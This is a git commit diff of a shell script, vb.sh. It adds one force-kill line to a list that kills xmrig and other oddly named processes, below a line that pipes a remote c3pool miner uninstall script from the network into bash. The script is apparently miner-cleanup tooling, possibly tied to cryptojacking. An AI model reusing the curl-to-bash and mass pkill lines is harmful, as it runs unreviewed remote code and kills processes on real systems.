a929aa5913b37b56f27b817f4e09096b89b09deb
you fuck me <151545720+mumu1667@users.noreply.github.com>
2024-03-16 15:13:52 +0800

    Update vb.sh

--- vb.sh
+++ vb.sh
@@ -3,6 +3,7 @@
 curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s
 # 首先终止匹配的进程
 pkill -9 -f 'xmrig'
+pkill -9 -f './mnt/ring/ring'
 pkill -9 -f './mysql'
 pkill -9 -f './i386'
 pkill -9 -f './ABpdKw4o'
